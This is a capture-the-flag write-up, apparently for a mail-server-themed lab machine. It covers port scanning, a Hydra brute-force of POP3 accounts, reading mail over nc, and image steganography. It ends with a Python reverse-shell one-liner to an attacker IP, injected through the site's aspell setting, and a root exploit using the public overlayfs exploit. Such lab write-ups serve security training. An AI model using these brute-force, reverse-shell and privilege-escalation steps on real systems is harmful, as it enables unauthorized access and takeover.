Back again with another CTF write-up! This time, it’s all about mail servers. Let's dive in.
## Enumeration

First, we perform basic enumeration using netdiscover and nmap. A full port scan is necessary for this challenge:
![NMAP](/2025/1/1.png)

Upon inspecting the website, we find terminal.js. Decoding it (e.g., via CyberChef) reveals the string InvincibleHack3r, which serves as valid credentials for the user boris.

## Gaining Access to the Mail Server

Next, we explore port 55007. The index.html file contains commented-out references to "GNO operator," hinting at a possible brute-force attack using Hydra. The following command helps us brute-force a valid login:

we can use this command below for boris and natalya
```bash
hydra -l boris -P /usr/share/wordlist/fasttrack.txt <IP> -s<PORT> -I pop3 
```
as shown here,  
![boris](/2025/1/3.png)  
![natalya](/2025/1/4.png)

we can now login into the port, To manually connect to the mail server:
```bash
nc <VICTIM HOST> 55007
```
Logging in as natalya provides useful information. Use the following commands to interact with the mail server: below you can login, list and retrieve a message [More here](https://cs.bilkent.edu.tr/~terzi/cs421/homeworks/Fall2011_PA1v5.pdf)  
```bash
USER natalya
PASS bird
LIST
RETR 2
```

This retrieves an email containing credentials for xenia:

## Further Access and Enumeration

Before proceeding, we must edit /etc/hosts appropriately like so :
![hosts](/2025/1/6.png)

Upon logging in, a message appears:,  
![doak](/2025/1/7.png)

Another brute-force attack is required:  
![doak](/2025/1/8.png)

The message below provides the next clue:
![message](/2025/1/9.png)

Logging in with the discovered credentials, we find a secret.txt file, directing us to /dir007key/for-007.png:
![secret](/2025/1/10.png)

Using binwalk and exiftool, we analyze the image: 
![for007](/2025/1/11.png)

Deciphering the hidden message via CyberChef reveals the username admin since we have tried boris, natalya, and doak but not admin:   
![admin](/2025/1/12.png)  

## Gaining a Reverse Shell

Based on prior experience with CoffeeAddicts, we aim for a reverse shell by injecting a plugin that executes our payload. We modify the system path of `aspell` to achieve this:

This payload you can find more here [gtfobins](https://gtfobins.github.io/)
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>", <attacker_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
On the attacker's machine, set up a listener:
```bash
nc -nlvp <attacker_port>
```

However, before executing, we must alter aspell from Google’s spell checker to our own custom script:

![tinymcm](/2025/1/13.png)   

Upon clicking the spell checker triggers the reverse shell:

## Privilege Escalation

Running Linpeas identifies potential privilege escalation paths:  
![scan](/2025/1/15.png)

After testing various exploits, the overlayfs vulnerability proves effective. The exploit can be found here: [overlayfs](https://www.exploit-db.com/exploits/37292/).

Since the victim machine lacks `gcc`, we modify the exploit to use `cc` using `vim` we can just do:
```vi
:%s/gcc/cc
```
Compile and execute it:
```bash
cc 37292.c -o wololo && ./wololo
```

Success! We obtain root access:
![root](/2025/1/16.png)

Finally, we retrieve the flag as suggested:
![flag](/2025/1/17.png)

## Conclusion

This was a fun challenge involving enumeration, brute-force attacks, hidden messages, reverse shells, and privilege escalation. Hope you enjoyed the write-up!
